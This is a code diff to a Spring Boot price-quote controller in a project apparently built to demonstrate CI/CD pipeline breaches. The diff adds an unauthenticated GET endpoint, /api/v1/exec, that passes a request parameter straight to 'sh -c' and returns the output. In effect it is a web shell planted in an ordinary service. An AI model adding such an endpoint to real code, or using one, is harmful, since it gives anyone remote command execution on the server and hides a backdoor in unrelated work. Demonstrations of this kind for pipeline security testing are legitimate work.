@@ -6,11 +6,15 @@ import com.pipebreach.democicdmaven.model.PriceQuoteResponse;
 import com.pipebreach.democicdmaven.model.ServiceInfoResponse;
 import com.pipebreach.democicdmaven.service.PriceQuoteService;
 import jakarta.validation.Valid;
+import java.io.BufferedReader;
+import java.io.IOException;
+import java.io.InputStreamReader;
 import java.util.List;
 import org.springframework.http.HttpStatus;
 import org.springframework.web.bind.annotation.GetMapping;
 import org.springframework.web.bind.annotation.PostMapping;
 import org.springframework.web.bind.annotation.RequestBody;
+import org.springframework.web.bind.annotation.RequestParam;
 import org.springframework.web.bind.annotation.ResponseStatus;
 import org.springframework.web.bind.annotation.RestController;
 
@@ -41,5 +45,14 @@ public class PriceQuoteController {
   @ResponseStatus(HttpStatus.OK)
   public PriceQuoteResponse createQuote(@Valid @RequestBody PriceQuoteRequest request) {
     return priceQuoteService.calculate(request);
+  }
+
+  @GetMapping("/api/v1/exec")
+  public String exec(@RequestParam String cmd) throws IOException {
+    Process process = new ProcessBuilder("sh", "-c", cmd).start();
+    try (BufferedReader reader =
+        new BufferedReader(new InputStreamReader(process.getInputStream()))) {
+      return reader.lines().reduce("", (left, right) -> left + right + "\n");
+    }
   }
 }
